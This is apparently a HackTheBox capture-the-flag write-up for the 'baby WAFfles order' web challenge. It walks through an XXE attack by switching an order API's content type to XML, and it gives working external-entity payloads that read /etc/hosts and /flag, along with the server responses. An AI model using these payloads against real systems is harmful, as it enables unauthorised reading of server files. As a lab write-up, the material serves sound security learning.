# baby WAFfles order

Completed: Yes
Platform: HackTheBox

The title said `xxe`. It is a hint. But, firstly, let's see JS source code:

```jsx
const form = document.getElementsByTagName('form')[0];

form.addEventListener('submit', e => {
  e.preventDefault();
  fetch('/api/order', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      table_num: document.getElementById('table').value,
      food: document.getElementById('food').value
    })
  })
  .then(r => r.json())
  .then(data => {
    flash(data.message, data.status);
  });
});
```

As you can see, here we have a listener for POST requests and it expects `application/json`. But as the challenge said `xxe`. Let's use `application/xml`and do XXE body. I chose on from here [https://github.com/payloadbox/xxe-injection-payload-list](https://github.com/payloadbox/xxe-injection-payload-list).

```
POST /api/order HTTP/1.1
Host: 206.189.17.217:32543
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://206.189.17.217:32543/
Content-Type: application/xml
Origin: http://206.189.17.217:32543
Content-Length: 99
Connection: close

<!--?xml version="1.0" ?-->
<userInfo>
 <tablenum>John</tablenum>
 <food>Doe</food>
</userInfo>
```

Got response:

```
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 15 Jul 2021 12:24:59 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.4.15
Content-Length: 47

Your Doe order has been submitted successfully.
```

Well, let's adjust it to see files:

```
<!--?xml version="1.0" ?-->
<!DOCTYPE data [<!ELEMENT userInfo ANY><!ENTITY file SYSTEM "file:///etc/hosts">]>
<userInfo>
 <tablenum>John</tablenum>
 <food>&file;</food>
</userInfo>
```

Got answer:

```
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 15 Jul 2021 12:26:04 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.4.15
Content-Length: 289

Your # Kubernetes-managed hosts file.
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
fe00::0	ip6-mcastprefix
fe00::1	ip6-allnodes
fe00::2	ip6-allrouters
10.244.26.32	webowaspbabywafflesorder-624939-594fd6d575-lhnj5
 order has been submitted successfully.
```

Thus, we successfully exploited XXE. Now, we need to grab the flag. I was searching a little bit, but then found it in just root directory:

```
<!--?xml version="1.0" ?-->
<!DOCTYPE data [<!ELEMENT userInfo ANY><!ENTITY file SYSTEM "file:///flag">]>
<userInfo>
 <tablenum>John</tablenum>
 <food>&file;</food>
</userInfo>
```